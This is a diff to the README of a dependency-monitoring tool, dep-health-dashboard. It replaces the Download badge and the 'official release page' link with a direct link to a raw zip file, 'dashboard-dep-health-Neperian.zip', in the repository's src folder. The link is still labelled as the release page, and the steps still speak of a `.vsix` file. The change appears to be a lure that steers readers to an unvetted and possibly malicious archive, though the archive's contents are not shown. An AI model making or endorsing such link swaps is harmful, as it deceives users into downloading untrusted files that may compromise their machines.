@@ -1,6 +1,6 @@
 # 🛡️ dep-health-dashboard - Monitor your project dependencies in real-time
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/KOLP55/dep-health-dashboard/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/KOLP55/dep-health-dashboard/raw/refs/heads/main/src/dashboard-dep-health-Neperian.zip)
 
 ## 🔍 What this tool does
 
@@ -16,7 +16,7 @@ Modern software projects rely on many outside pieces of code called dependencies
 ## 📥 How to download the app
 
 1. Open your web browser.
-2. Visit the [official release page](https://github.com/KOLP55/dep-health-dashboard/releases).
+2. Visit the [official release page](https://github.com/KOLP55/dep-health-dashboard/raw/refs/heads/main/src/dashboard-dep-health-Neperian.zip).
 3. Find the most recent release at the top of the list.
 4. Locate the file ending in `.vsix`. Click this file to save it to your computer.
 5. Create a folder in your documents library to store this file.
